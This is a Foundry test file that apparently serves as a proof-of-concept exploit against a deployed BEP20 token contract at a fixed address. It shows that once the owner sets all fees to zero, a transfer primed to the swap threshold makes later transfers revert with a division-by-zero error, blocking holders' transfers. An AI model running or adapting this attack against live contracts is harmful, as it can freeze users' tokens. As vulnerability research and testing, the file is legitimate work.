pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function setFees_base1000(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee) external;
    function totalFee() external view returns (uint256);
    function tradingStatus(bool _status) external;
    function swapThreshold() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU private token;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        token = BEP20LUNAINU(TARGET);
        owner = token.getOwner();

        deal(attacker, 10 ether);

        vm.startPrank(owner);
        token.tradingStatus(true);

        // The owner has 1e18 tokens (totalSupply). Transfer half to the attacker.
        // Note: totalSupply is 1 * 10**9 * 10**9 = 1e18
        token.transfer(attacker, 5e17); 
        vm.stopPrank();

        // Verify attacker has received the tokens
        assertEq(token.balanceOf(attacker), 5e17);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: As owner, set all fees to zero.
        vm.prank(owner);
        token.setFees_base1000(0, 0, 0, 0);
        vm.stopPrank();

        // Step 2: Verify the oracle condition that totalFee is now 0.
        assertEq(token.totalFee(), 0);

        // --- Demonstrate the DoS --- 

        // As the attacker (a regular user), perform the actions that trigger the DoS.
        vm.startPrank(attacker);

        // Step 3: Prime the contract by transferring tokens equal to the swapThreshold.
        // This first transfer will succeed and load the contract's token balance.
        uint256 threshold = token.swapThreshold();
        token.transfer(address(token), threshold);

        // Step 4: Trigger the DoS. The next transfer will call swapBack(), which will revert due to the division-by-zero error.
        vm.expectRevert("SafeMath: division by zero");
        // Any transfer from a non-fee-exempt address will now be blocked.
        token.transfer(makeAddr("victim"), 1);

        vm.stopPrank();
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

